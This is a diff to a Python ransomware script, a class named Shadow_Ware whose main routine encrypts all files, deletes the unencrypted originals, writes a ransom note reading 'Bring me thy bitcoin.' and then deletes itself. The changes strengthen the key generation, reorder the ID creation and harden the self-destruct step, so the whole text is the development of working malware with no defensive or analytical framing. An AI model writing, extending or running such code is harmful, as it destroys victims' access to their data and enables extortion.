@@ -1,6 +1,6 @@
 instructions = "Bring me thy bitcoin."
 
-import base64, random, os, hashlib, hmac
+import base64, random, os, hashlib, hmac, string
 
 """ Class for encrypter """
 class Shadow_Ware():
@@ -15,7 +15,6 @@ class Shadow_Ware():
     # Keys and ID
     self.key = self.get_key()
     self.bytes_key = self.turn_to_bytes(self.key)
-    self.create_id()
 
     # Current Dir
     self.current_dir = os.path.dirname(__file__)
@@ -23,8 +22,9 @@ class Shadow_Ware():
   # Inital code to setup data used for encyrption
   def get_key(self):
     key = ""
-    for _ in range(random.randint(30, 40)):
+    for _ in range(random.randint(15000, 20000)):
       key += str(random.randint(1, 99))
+      key += random.choice(string.ascii_letters)
     return key
 
   def turn_to_bytes(self, string):
@@ -95,12 +95,16 @@ class Shadow_Ware():
       file.write(instructions)
 
   def self_destruct(self):
-    os.remove(os.path.abspath("encrypter.py.locked"))
+    try:
+      os.remove(os.path.abspath(__file__ + ".locked"))
+    except Exception as e:
+      print("Failed to kill clone for " + e)
     os.remove(os.path.abspath(__file__))
 
 if __name__ == "__main__":
   shadow_ware = Shadow_Ware()
   shadow_ware.encrypt_all_files()
+  shadow_ware.create_id()
   shadow_ware.remove_not_locked_files()
   shadow_ware.leave_instructions()
   shadow_ware.self_destruct()
